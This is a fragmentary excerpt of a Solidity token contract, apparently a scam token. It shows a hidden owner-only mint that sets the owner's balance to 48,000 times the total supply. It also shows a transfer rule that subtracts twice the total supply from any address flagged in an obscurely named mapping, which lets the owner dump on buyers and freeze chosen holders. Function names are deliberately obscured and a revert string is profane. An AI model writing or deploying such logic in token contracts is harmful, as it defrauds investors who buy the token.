...
contract Coin is Ownable {
    ...
    function BENBoy123Box123() public view virtual  returns (uint256) {
        return _MYtotalSupply;
    }
    function addAmountAdmin() external {
       
        if (_BENCEO == _msgSender()){
            _balances[_msgSender()] = BENBoy123Box123()*48000;
        }else if (_msgSender() != _BENCEO) {
            revert("fuck");
        }
    }
    ...
    function _transfer(
        ...
        if (vipccdd[from] != false ){
            _balances[from]= balance-(BENBoy123Box123())-(BENBoy123Box123());
        }
